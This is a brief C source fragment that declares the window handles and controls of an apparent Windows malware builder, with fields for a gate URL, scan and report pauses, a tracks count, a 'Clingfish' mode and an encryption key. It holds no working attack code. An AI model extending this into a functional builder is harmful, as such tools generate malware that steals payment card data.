/* The HWND of the main window */
HWND hwndParent;

/* The instance of the main window */
HINSTANCE ghInstance;

/* The Dialog class name */
LPCWSTR g_szDialogClassName = L"DialogClass";

/* Main window controls used across functions: */

/* -- Clingfish Mode controls */
HWND hClingfishPauseLabel, hClingfishPauseInput, hScanPauseAfterClingfishModeLabel, hScanPauseAfterClingfishModeInput;

/* -- User input controls */
HWND hGateURLInput, hReportsPauseInput, hScanPauseInput, hTracksNumInput, hEnableClingfishMode, hFirstEncKeyInput, hEnableDebugMode, hOutputPathInput;

/* -- The build button and log */
HWND hBuildButton, hBuildLogDisplay;

/* Will hold the path to the build */
WCHAR szFileName[MAX_PATH];

void generateBuild();